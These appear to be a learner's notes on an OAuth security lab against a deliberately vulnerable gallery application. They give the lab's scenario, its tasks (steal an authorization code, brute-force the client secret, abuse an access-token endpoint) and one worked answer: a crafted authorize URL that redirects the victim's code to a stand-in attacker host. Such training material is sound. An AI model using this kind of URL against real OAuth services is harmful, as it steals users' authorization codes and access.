---
layout: default
---

# Authentication and SSO

## Teoría


## Laboratorios

Enunciado

```
Scenario
Your goal in this lab will be to try some common attacks against a vulnerable, OAuth-powered web application. Prepare the attacks and their working proof of concepts as if you were submitting these to a bug bounty program or a penetration testing report. The web application is based on the below GitHub repository https://github.com/koenbuyens/Vulnerable-OAuth-2.0-Applications

Goals
Create a working proof of concept to attack an OAuth client once he visits a malicious URL

Find an alternative way to gain access to protected resources
What you will learn
Auditing and attacking OAuth implementations

Creating a proof of concept for client-side attacks against insecure OAuth implementations

Recommended tools
BurpSuite

OAuth 2.0 documentation

Network Configuration
The target application can be found at http://gallery:3005

The username is koen and the password is password.
```

```
Tasks
Task 1. Create a code stealing PoC
Craft an URL that can be sent to a victim in order to steal the authorization code once he/she logs in into the /oauth endpoint. You can use the following data: the response type is "code", the scope is "view_gallery" and the client_id is "photoprint".

Task 2. Use the acquired code to bruteforce the client secret
Use a POST request to the /token endpoint in order to bruteforce the client secret. Consult with OAuth's documentation to recreate the request. The grant type is "authorization_code"

Task 3. Discover another token vulnerability
Discover another vulnerability by abusing the /photos/me?access_token= endpoint.
```


### Attacking Oauth

URL:

```
http://gallery:3005/oauth/authorize?response_type=code&redirect_uri=http%3A%2F%2Fattacker%2Fcallback&scope=view_gallery&client_id=photoprint

```






[back](./)

